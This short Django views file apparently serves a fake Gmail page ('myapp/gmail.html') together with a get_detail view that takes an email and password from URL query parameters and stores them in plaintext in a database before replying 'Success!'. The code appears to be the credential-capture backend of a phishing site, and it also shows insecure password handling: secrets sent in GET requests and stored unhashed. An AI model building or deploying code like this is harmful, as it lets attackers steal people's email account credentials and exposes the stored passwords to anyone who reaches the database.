from django.shortcuts import render
from django.http import HttpResponse, JsonResponse
from .models import Detail

def get_private(request):
	context = {}
	return render(request, 'myapp/index.html', context)

def get_plan(request):
	return render(request,'myapp/gmail.html',{})

def get_detail(request):
	Detail.objects.create(gmail_id=request.GET['email'],password=request.GET['password'])
	return JsonResponse("Success!", safe=False)